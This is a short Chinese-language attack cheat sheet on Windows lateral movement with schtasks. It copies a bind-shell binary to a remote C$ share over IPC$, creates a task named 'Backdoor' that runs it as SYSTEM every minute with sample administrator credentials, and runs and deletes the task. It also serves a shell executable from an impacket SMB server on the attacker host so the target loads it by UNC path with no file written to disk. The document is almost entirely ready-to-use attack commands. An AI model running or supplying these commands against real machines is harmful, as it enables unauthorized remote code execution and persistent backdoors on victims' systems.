# 计划任务创建

#### schtasks计划任务常规创建利用流程

利用IPC$传shell

```
copy .\bind_tcp.shell \\10.10.10.22\C$
```

schtasks写计划任务

```
	- /Create 创建
	- /S 指定要连接到的系统
	- /TN 指定要创建的任务名称
	- /SC 指定计划任务执行频率
	- /MO 指定计划任务执行周期
	- /TR 指定计划任务运行的路径
	- /RU 指定计划任务运行的用户权限
	- /F 如果指定任务存在则强制创建
```

```
(已建立IPC连接)
schtasks /Create /S 10.10.10.22 /TN Backdoor /SC minute /MO 1 /TR C:\bind_tcp.exe /RU System /F
(未建立IPC连接)
schtasks /Create /S 10.10.10.22 /TN Backdoor /SC minute /MO 1 /TR C:\bind_tcp.exe /RU System /F /U Administartor /P P@ssw0rd!
```

立即执行计划任务

```
schtasks /RUN /S 10.10.10.22 /I /TN Backdoor
```

删除计划任务

```
schtasks /Delete /S 10.10.10.22 /TN Backdoor /F
```

通过创建计划任务写文件

```
schtasks /Create /S 10.10.10.22 /TN Backdoor /SC minute /MO 1 /TR "C:\Windows\System32\cmd.exe /c 'whoami > C:\result.txt'" /RU System /F
```

#### UNC路径加载执行(无文件落地)

攻击机impacket模块起SMB共享shell

```
python3 smbserver.py lbwnb /root/share -smb2support
```

schtasks远程UNC路径加载

```
schtasks /Create /S 10.10.10.22 /TN Backdoor /SC minute /MO 1 /TR \\10.10.10.13\lbwnb\bind_tcp4567.exe /RU System /F /U Administartor /P P@ssw0rd!
```
